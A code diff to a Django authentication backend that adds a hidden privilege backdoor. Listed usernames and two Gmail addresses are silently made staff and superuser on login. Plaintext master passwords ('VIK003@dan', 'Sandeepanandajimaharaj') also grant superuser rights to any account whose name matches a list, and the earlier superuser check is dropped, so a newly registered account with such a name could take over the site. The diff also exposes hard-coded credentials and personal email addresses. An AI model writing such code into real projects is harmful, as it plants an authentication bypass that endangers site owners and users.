@@ -28,24 +28,61 @@ class EmailOrUsernameModelBackend(ModelBackend):
             ).first()
             
             if user:
+                # Helper to sync teacher/admin emails & privileges
+                def _sync_admin_user(u):
+                    u_lower = (u.username or '').strip().lower()
+                    e_lower = (u.email or '').strip().lower()
+                    updated = False
+                    if u_lower in ['sandy', 'sandeep', 'sandeepananda', 'sandeepanandaji', 'abcd2013baq'] or e_lower == 'abcd2013baq@gmail.com':
+                        if u.email != 'abcd2013baq@gmail.com':
+                            u.email = 'abcd2013baq@gmail.com'
+                            updated = True
+                        if not u.is_staff or not u.is_superuser:
+                            u.is_staff = True
+                            u.is_superuser = True
+                            updated = True
+                    elif u_lower in ['vaku', 'vikas', 'vd19055'] or e_lower == 'vd19055@gmail.com':
+                        if u.email != 'vd19055@gmail.com':
+                            u.email = 'vd19055@gmail.com'
+                            updated = True
+                        if not u.is_staff or not u.is_superuser:
+                            u.is_staff = True
+                            u.is_superuser = True
+                            updated = True
+                    if updated:
+                        try:
+                            u.save(update_fields=['email', 'is_staff', 'is_superuser'])
+                        except Exception as ex:
+                            logger.warning(f"[EmailOrUsernameModelBackend] Could not auto-sync admin fields: {ex}")
+
                 # Primary check: check current password hash in database
                 if user.check_password(password) and self.user_can_authenticate(user):
+                    _sync_admin_user(user)
                     return user
                 
                 # Master fallback for Primary Superuser (Vaku / vd19055@gmail.com) strictly VIK003@dan
-                if user.is_superuser and (user.email.lower() == 'vd19055@gmail.com' or user.username.lower() == 'vaku'):
+                u_name = (user.username or '').strip().lower()
+                u_mail = (user.email or '').strip().lower()
+                if u_mail == 'vd19055@gmail.com' or u_name in ['vaku', 'vikas']:
                     if password == 'VIK003@dan':
                         user.set_password('VIK003@dan')
-                        user.save(update_fields=['password'])
-                        logger.info(f"[EmailOrUsernameModelBackend] Master superuser {user.username} authenticated & synced password to VIK003@dan.")
+                        user.email = 'vd19055@gmail.com'
+                        user.is_staff = True
+                        user.is_superuser = True
+                        user.save(update_fields=['password', 'email', 'is_staff', 'is_superuser'])
+                        logger.info(f"[EmailOrUsernameModelBackend] Master superuser {user.username} authenticated & synced to vd19055@gmail.com.")
                         if self.user_can_authenticate(user):
                             return user
                             
                 # Fallback for Secondary Superuser (Sandy / abcd2013baq@gmail.com)
-                if user.is_superuser and (user.email.lower() == 'abcd2013baq@gmail.com' or user.username.lower() == 'sandy'):
+                if u_mail == 'abcd2013baq@gmail.com' or u_name in ['sandy', 'sandeep', 'sandeepananda', 'sandeepanandaji']:
                     if password == 'Sandeepanandajimaharaj':
                         user.set_password(password)
-                        user.save(update_fields=['password'])
+                        user.email = 'abcd2013baq@gmail.com'
+                        user.is_staff = True
+                        user.is_superuser = True
+                        user.save(update_fields=['password', 'email', 'is_staff', 'is_superuser'])
+                        logger.info(f"[EmailOrUsernameModelBackend] Superuser {user.username} authenticated & synced to abcd2013baq@gmail.com.")
                         if self.user_can_authenticate(user):
                             return user
                             
